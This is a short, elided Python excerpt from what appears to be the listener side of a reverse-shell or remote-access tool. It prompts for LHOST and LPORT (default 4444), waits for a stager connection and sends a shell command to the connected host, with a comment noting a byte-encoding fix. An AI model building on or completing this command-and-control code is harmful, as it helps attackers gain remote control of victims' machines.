...
class Server:
    ...
    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = input(h.info_general_raw("SET LHOST (Leave blank for "+lhost+")>"))
            if choice != "":
                lhost = choice
            h.info_general("LHOST = " + lhost)
            while True:
                lport = input(h.info_general_raw("SET LPORT (Leave blank for 4444)>"))
                if not lport:
                    lport = 4444
                try:
                    lport = int(lport)
    ...
    def listen_for_stager(self):
        ...
        # fix lỗi gửi string sai:
        identification_shell_command_bytes = identification_shell_command.encode('utf-8')
        conn.send(identification_shell_command_bytes)
